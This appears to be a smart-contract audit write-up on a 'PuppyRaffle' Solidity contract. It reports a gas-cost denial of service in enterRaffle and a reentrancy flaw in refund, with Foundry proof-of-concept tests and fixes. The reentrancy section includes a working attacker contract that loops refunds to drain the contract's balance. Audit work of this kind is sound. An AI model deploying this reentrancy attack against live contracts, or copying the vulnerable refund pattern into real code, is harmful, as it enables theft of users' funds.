### [M-#] Array in `PuffyRaffle::enterRaffle` is a potencial denial of service (DoS) attack, incrementing gas costs dor future participants

**Description:** 

The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. The longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This will cause the gas costs to increase over time. First players will have advantage on joining the raffle first.

```javascript
//@audit DoS Attack
@>        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```


**Impact:**

 The gas costs for raffle players will increase as more players join. This discourages later users from entering to a new position.
An attacker might fill up the `PuppyRaffle::players` array so no one else enters, guarenteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players entering the raffle, the gas costs will be as such:

  Gas cost for the first 100 players: 6252048
  Gas cost for the second 100 players: 18068138

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`. 

```javascript
    function test_DenialOfService() public {

        vm.txGasPrice(1);

        // First 100 players entering the raffle
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for(uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }

        // Check gas costs
        uint256 initialGas = gasleft();
        puppyRaffle.enterRaffle {value: entranceFee * players.length}(players);
        uint256 finalGas = gasleft();
        uint256 gasUsedFirstPlayers = (initialGas - finalGas) * tx.gasprice;
        console.log("Gas cost for the first 100 players", gasUsedFirstPlayers);

        // Second 100 players entering the raffle
        address[] memory players2 = new address[](numPlayers);
        for(uint256 i = 0; i < numPlayers; i++) {
            players2[i] = address(i + numPlayers);
        }

        // Check gas costs
        uint256 secondInitialGas = gasleft();
        puppyRaffle.enterRaffle {value: entranceFee * players.length}(players2);
        uint256 secondFinalGas = gasleft();
        uint256 gasUsedSecondPlayers = (secondInitialGas - secondFinalGas) * tx.gasprice;
        console.log("Gas cost for the second 100 players", gasUsedSecondPlayers);        
    }
```
</details>


**Recommended Mitigation:** There are a few recomendations.

1. Consider allowing duplicates. Users can still make new addresses and join the raffle. Duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address. 

2.  Consider using a mapping for duplicates. This would allow constant time lookup of wheter a user has already entered.


### [H-#] `PuppyRaffle::refund` function suffers from a possible reentrancy attack that will drain all the contract balance.

**Description:**

As the name implies `PuppyRaffle::refund` gives a chance for a player to withdraw his entrance fee. As the contract in not following best practices, for example using Checks - Effects - Interactions, this gives the opportunity for a malicious contract to be the msg.sender of the call to `PuppyRaffle::refund`. As the code only checks for the player index, the malicious contract can be a player of the raffle, making a call to refund. If the attacker contract has a receive function that calls refund again, this loop would eventually drain the Puppy Raffle balance.


Vulnerability:
````` javascript
// @audit -> Reentrancy Attack
@>    function refund(uint256 playerIndex) public {

        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

`````

**Impact:**

The malicious contract can eventually drain all the contract funds by calling refund repeatedly.
 This would make all players to loose their balance, stored in the contract.

**Proof of Concept:**

<details>
<summary>PoC</summary>
Place the following attack contract test and test for the attack into `PuppyRaffleTest.t.sol`. 

```javascript

contract Reentrancy {

    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(index);
        
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
            uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(index);
        }

    }

}

```
</details>

Note: Someone calls the attack function on this contract, that will make it join the raffle and then ask for a refund.
    When the Puffy Raffle send the refund to this contract, it will trigger the receive function that will call refund again, before updating the raffle players mapping, until the contract has no more funds left.

<details>

```javascript
    function test_reentrancy() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        Reentrancy attackerContract = new Reentrancy(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startBalanceAttackContract = address(attackerContract).balance;
        uint256 raffleStartContractBalance = address(puppyRaffle).balance;

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting attacker contract balance", startBalanceAttackContract);
        console.log("Starting Puppy Raffle balance", raffleStartContractBalance);

        console.log("Ending attacker contract balance", address(attackerContract).balance);
        console.log("Ending Puppy Raffle balance", address(puppyRaffle).balance);

    }

```
</details>

**Recommended Mitigation:**

1. Change function structure, following CEI best practices (Checks - Effects - Interactions).

